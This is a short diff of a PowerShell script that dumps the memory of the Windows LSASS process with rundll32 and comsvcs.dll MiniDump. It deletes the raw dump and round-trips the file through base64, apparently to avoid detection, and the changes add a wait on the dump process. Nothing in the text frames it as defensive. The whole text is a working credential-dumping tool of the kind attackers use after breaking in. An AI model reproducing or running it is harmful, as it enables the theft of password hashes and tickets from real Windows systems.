@@ -3,7 +3,7 @@ $currentPath = $basespace + '\Workspace'
 if(!(Test-Path -Path $currentPath)){mkdir $currentPath}
 if(!(Test-Path -Path $currentPath\DUMP)){mkdir $currentPath\DUMP\}
 $DumpPath = $currentPath + "\DUMP"
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (ps lsass).id $DumpPath\DUMP-${env:computername} full
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (ps lsass).id $DumpPath\DUMP-${env:computername} full; Wait-Process -Id (ps rundll32).Id
 
 $DumpFile = $DumpPath + "\DUMP-" + ${env:computername}
 $FilePath = $DumpFile + "-Decoded"
@@ -14,9 +14,7 @@ $File = [System.IO.File]::ReadAllBytes($DumpFile);
 Remove-Item -Path $DumpFile
 $Base64String = [System.Convert]::ToBase64String($File);
 $Base64String | Out-File -FilePath $EncodeDumpPath
-$EncodedString = Get-Content $EncodeDumpPath
-
- 
+$EncodedString = Get-Content $EncodeDumpPath 
 try {
 if ($EncodedString.Length -ge 1) {$ByteArray = [System.Convert]::FromBase64String($EncodedString);[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);}}
 catch {}
